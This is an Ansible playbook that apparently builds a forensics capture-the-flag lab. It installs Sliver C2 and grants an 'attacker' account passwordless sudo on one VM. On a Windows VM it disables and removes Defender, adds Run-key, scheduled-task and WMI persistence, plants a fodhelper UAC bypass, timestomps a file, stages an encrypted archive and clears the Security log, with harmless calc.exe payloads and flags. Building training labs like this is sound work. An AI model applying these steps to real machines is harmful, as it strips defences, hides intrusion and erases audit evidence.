# provisioning/playbook.yml
- name: Configure axvm
  hosts: axvm
  gather_facts: false
  become: true
  pre_tasks:
    - name: Wait for SSH to accept connections
      ansible.builtin.wait_for_connection:
        delay: 0
        sleep: 10
        timeout: 900
  roles:
    - role: ansible-role-user-access
      user_access_username: attacker
      user_access_password: Password123!
      user_access_admin: True
  tasks:
    - name: Grant attacker unrestricted sudo (NOPASSWD ALL)
      ansible.builtin.copy:
        dest: /etc/sudoers.d/attacker
        content: "attacker ALL=(ALL) NOPASSWD:ALL\n"
        owner: root
        group: root
        mode: "0440"
        validate: /usr/sbin/visudo -cf %s

    - name: Install forensic and analysis tooling
      ansible.builtin.apt:
        name:
          - curl
          - git
          - foremost
          - binutils
          - cifs-utils
          - smbclient
          - terminator
        state: present
        update_cache: true

    - name: Ensure Investigation mount point exists
      ansible.builtin.file:
        path: /mnt/investigation
        state: directory
        mode: "0755"

    - name: Download Sliver C2 GitHub install script
      ansible.builtin.get_url:
        url: https://sliver.sh/install
        dest: /tmp/sliver-install.sh
        mode: "0755"
        force: true

    - name: Install Sliver C2 via official install script
      ansible.builtin.command: /tmp/sliver-install.sh
      args:
        creates: /root/sliver-server

    - name: Ensure Sliver C2 server is enabled and running as a service
      ansible.builtin.systemd:
        name: sliver
        daemon_reload: true
        enabled: true
        state: started

- name: Configure wvvm
  hosts: wvvm
  gather_facts: false
  pre_tasks:
    - name: Wait for PSRP listener to accept connections
      ansible.builtin.wait_for_connection:
        delay: 0
        sleep: 10
        timeout: 900
  roles:
    - role: ansible-role-user-access-windows
      user_access_username: LocalAdmin
      user_access_password: Password123!
      user_access_rdp: True
      user_access_admin: True
  tasks:
    - name: Ensure TermService is running before RDP handler fires
      ansible.windows.win_service:
        name: TermService
        state: started

    - name: Flush pending handlers now (prevents deferred RDP restart hang at end of play)
      ansible.builtin.meta: flush_handlers

    - name: Disable Windows Defender real-time monitoring and engine via policy
      ansible.windows.win_regedit:
        path: "{{ item.path }}"
        name: "{{ item.name }}"
        data: 1
        type: dword
      loop:
        - { path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender', name: DisableAntiSpyware }
        - { path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender', name: DisableAntiVirus }
        - { path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', name: DisableRealtimeMonitoring }
        - { path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', name: DisableBehaviorMonitoring }
        - { path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', name: DisableOnAccessProtection }
        - { path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', name: DisableScanOnRealtimeEnable }

    - name: Disable Defender preferences via Set-MpPreference
      ansible.windows.win_shell: |
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
      changed_when: false
      failed_when: false

    - name: Uninstall Windows-Defender feature
      ansible.windows.win_feature:
        name: Windows-Defender
        state: absent
      register: defender_feature

    - name: Reboot if Defender removal requires it
      ansible.windows.win_reboot:
      when: defender_feature.reboot_required | default(false)

    - name: Ensure DumpIt destination exists
      ansible.windows.win_file:
        path: C:\Tools\DumpIt
        state: directory

    - name: Download DumpIt for Windows
      ansible.windows.win_get_url:
        url: https://github.com/thimbleweed/All-In-USB/raw/master/utilities/DumpIt/DumpIt.exe
        dest: C:\Tools\DumpIt\DumpIt.exe

    - name: Create DumpIt shortcut on the public Desktop
      community.windows.win_shortcut:
        src: C:\Tools\DumpIt\DumpIt.exe
        dest: C:\Users\Public\Desktop\DumpIt.lnk
        description: DumpIt - Memory acquisition tool

    - name: Ensure Strings destination exists
      ansible.windows.win_file:
        path: C:\Tools\Strings
        state: directory

    - name: Download Sysinternals Strings
      ansible.windows.win_get_url:
        url: https://download.sysinternals.com/files/Strings.zip
        dest: C:\Windows\Temp\Strings.zip

    - name: Extract Strings
      community.windows.win_unzip:
        src: C:\Windows\Temp\Strings.zip
        dest: C:\Tools\Strings

    - name: Remove temp files
      ansible.windows.win_file:
        path: C:\Windows\Temp\Strings.zip
        state: absent

    - name: Ensure Investigation share directory exists
      ansible.windows.win_file:
        path: C:\Investigation
        state: directory

    - name: Grant Everyone Modify on Investigation folder (NTFS)
      ansible.windows.win_acl:
        path: C:\Investigation
        user: Everyone
        rights: Modify
        type: allow
        state: present
        inherit: ContainerInherit, ObjectInherit
        propagation: None

    - name: Create Investigation SMB share with Everyone read/write
      ansible.windows.win_share:
        name: investigation
        path: C:\Investigation
        description: Forensic investigation share (read/write for Everyone)
        change: Everyone
        read: Everyone
        state: present

    - name: Add Run key persistence launching calc.exe on logon (T1547.001)
      ansible.windows.win_regedit:
        path: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        name: CTF{P3r5i5t3nc3_v14_Run_K3y5}
        data: calc.exe
        type: string
        state: present

    - name: Plant initial foothold flag on LocalAdmin Desktop
      ansible.windows.win_copy:
        content: "CTF{1n1t14l_F00th0ld_0n_wvvm}\n"
        dest: C:\Users\LocalAdmin\Desktop\initial_foothold_flag.txt

    - name: Ensure attacker staging directory exists
      ansible.windows.win_file:
        path: C:\ProgramData\svc
        state: directory

    - name: Drop benign investigation note (host for ADS)
      ansible.windows.win_copy:
        content: "Investigation notes for wvvm case #2026-07-INTR.\n"
        dest: C:\Investigation\notes.txt

    - name: Hide flag in Alternate Data Stream (T1564.004)
      ansible.windows.win_shell: |
        Set-Content -Path 'C:\Investigation\notes.txt' -Stream 'hidden' -Value 'CTF{H1dd3n_1n_Alt3rn4t3_D4t4_Str34m}'
      changed_when: false

    - name: Create scheduled task persistence (T1053.005)
      community.windows.win_scheduled_task:
        name: GoogleUpdaterCore
        description: "Google Updater Core - CTF{Sch3dul3d_T4sk_P3rs1st3nc3}"
        actions:
          - path: cmd.exe
            arguments: /c calc.exe
        triggers:
          - type: logon
        username: SYSTEM
        run_level: highest
        state: present
        enabled: true

    - name: Establish WMI Event Subscription persistence (T1546.003)
      ansible.windows.win_shell: |
        $filterName = 'FIN7SysDrainFilter'
        $consumerName = 'CTF{WMI_3v3nt_Subscr1pt10n_C4rb4n4k}'
        $existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
        if (-not $existing) {
          $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $filterName
            EventNamespace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
          }
          $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $consumerName
            CommandLineTemplate = 'C:\Windows\System32\calc.exe'
          }
          Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
          }
        }
      changed_when: false

    - name: Plant UAC bypass hijack via fodhelper (T1548.002)
      ansible.windows.win_regedit:
        path: HKCU:\Software\Classes\ms-settings\Shell\Open\command
        name: "{{ item.name }}"
        data: "{{ item.data }}"
        type: string
        state: present
      loop:
        - { name: "(Default)", data: "cmd.exe /c echo CTF{UAC_Byp4ss_v14_f0dh3lp3r} > C:\\Users\\Public\\uac_bypass.txt" }
        - { name: DelegateExecute, data: "" }

    - name: Drop timestomped loader stub (T1070.006)
      ansible.windows.win_shell: |
        $target = 'C:\ProgramData\svc\svcupdater.exe'
        Set-Content -Path $target -Value 'FIN7 loader stub - flag: CTF{T1m3st0mp3d_MFT_M1sm4tch}' -Encoding ASCII
        $stampDate = [DateTime]'2020-01-15 03:14:15'
        $f = Get-Item $target
        $f.CreationTime   = $stampDate
        $f.LastWriteTime  = $stampDate
        $f.LastAccessTime = $stampDate
      changed_when: false

    - name: Install 7-Zip for encrypted staging
      chocolatey.chocolatey.win_chocolatey:
        name: 7zip
        state: present

    - name: Prepare decoy document for staging
      ansible.windows.win_copy:
        content: |
          Confidential Corporate Data
          ---------------------------
          Flag: CTF{Ex71ltr4t10n_St4g3d_H3r3}
        dest: C:\ProgramData\svc\_stage_decoy.txt

    - name: Build password-protected staged archive (T1074.001, T1560.001)
      ansible.windows.win_shell: |
        $sevenZip = 'C:\Program Files\7-Zip\7z.exe'
        if (Test-Path 'C:\ProgramData\svc\stage.7z') { Remove-Item 'C:\ProgramData\svc\stage.7z' -Force }
        & $sevenZip a -p'CTF{P4ssw0rd_Pr0t3ct3d_4rch1v3}' -mhe=on 'C:\ProgramData\svc\stage.7z' 'C:\ProgramData\svc\_stage_decoy.txt' | Out-Null
        Remove-Item 'C:\ProgramData\svc\_stage_decoy.txt' -Force
      changed_when: false

    - name: Drop fake Seatbelt binary and execute to seed Prefetch (T1082/T1087)
      ansible.windows.win_shell: |
        Copy-Item -Path 'C:\Windows\System32\whoami.exe' -Destination 'C:\ProgramData\svc\Seatbelt.exe' -Force
        & 'C:\ProgramData\svc\Seatbelt.exe' /all 2>&1 | Out-File 'C:\ProgramData\svc\seatbelt_out.txt' -Encoding utf8
        Add-Content -Path 'C:\ProgramData\svc\seatbelt_out.txt' -Value 'CTF{S34tb3lt_Pr3f3tch_D1sc0v3ry}'
      changed_when: false

    - name: Stop and disable Print Spooler as impact IOC (T1489)
      ansible.windows.win_service:
        name: Spooler
        state: stopped
        start_mode: disabled

    - name: Drop log-clearing operator artifact
      ansible.windows.win_copy:
        content: "Operator cleared Security log during cleanup phase.\nFlag: CTF{Cl34r3d_S3cur1ty_L0g}\n"
        dest: C:\Users\Public\log_cleared_by.txt

    - name: Clear Security event log to erase attacker traces (T1070.001)
      ansible.windows.win_shell: wevtutil cl Security
      changed_when: false